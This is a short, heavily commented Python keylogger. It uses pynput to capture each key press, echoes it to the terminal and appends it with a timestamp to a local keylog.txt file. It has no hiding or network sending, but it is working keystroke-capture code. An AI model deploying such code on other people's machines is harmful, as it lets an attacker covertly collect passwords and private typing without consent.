# Import the keyboard listener from the pynput library
from pynput import keyboard

# Import datetime so we can timestamp each keystroke
from datetime import datetime

# Import os so we can build a path to the log file that matches the script's folder
import os

# Create a path to 'keylog.txt' in the same folder as this script
LOG_FILE = os.path.join(os.path.dirname(__file__), "keylog.txt")

# Define a function that runs every time a key is pressed
def log_keystroke(key):
    try:
        # Try to get the character of the key (e.g., 'a', 'b', '1')
        key_str = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        # If the key has no character (e.g., Shift, Ctrl), convert it to a string
        key_str = str(key)

    # Print the captured key to the terminal (for debugging)
    print(f"Captured: {key_str}")

    # Open the log file in append mode and write the timestamp + key
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {key_str}\n")

# Define the main function that starts the keylogger
def main():
    print("Keylogger started...")

    # Start listening for key presses and call log_keystroke each time
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()  # Keep the listener running until manually stopped

# Run the main function if this script is executed directly
if __name__ == "__main__":
    main()
